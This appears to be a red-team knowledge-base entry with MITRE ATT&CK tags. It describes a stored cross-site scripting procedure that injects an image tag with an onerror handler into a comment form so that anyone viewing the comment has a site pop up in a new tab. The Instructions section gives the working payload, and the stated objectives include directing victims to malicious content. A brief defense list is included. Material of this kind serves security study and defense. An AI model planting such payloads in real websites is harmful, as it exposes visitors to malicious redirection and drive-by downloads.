---
id: uuid-inject-redirect
tags:
  - xss
  - redirection
  - drive-by
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:26.045Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Redirect Payload in Comments

## Summary

This procedure injects an image tag with an onerror handler into the Comments field to force a popup redirection to a malicious site upon comment viewing.

## Description

The payload uses a broken image src='x' to trigger onerror, executing JavaScript to open http://catcompusa.com in a new tab. This persists and executes client-side, potentially leading to drive-by downloads or further exploitation.

## Requirements

1. Comment form access
2. Target malicious URL (e.g., http://catcompusa.com)
3. Understanding of event handlers

## Defense

Defensive measures and detection strategies:

- Strip or escape event handlers (onerror, onload) in inputs
- Enforce strict CSP to prevent window.open
- Log client-side script executions

## Objectives

1. Trigger automatic redirection
2. Direct victims to malicious content
3. Confirm execution via access logs

## Instructions

### Step 1: Submit Onerror Payload

**Context**: Use invalid image to invoke JS redirection.

In the Comments field, input: `<img src=x onerror='javascript:window.open("http://catcompusa.com")'></img>`

Fill Name and submit.

> Expected output: Tag stored; onerror fires on view, opening the site.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[redirection]]

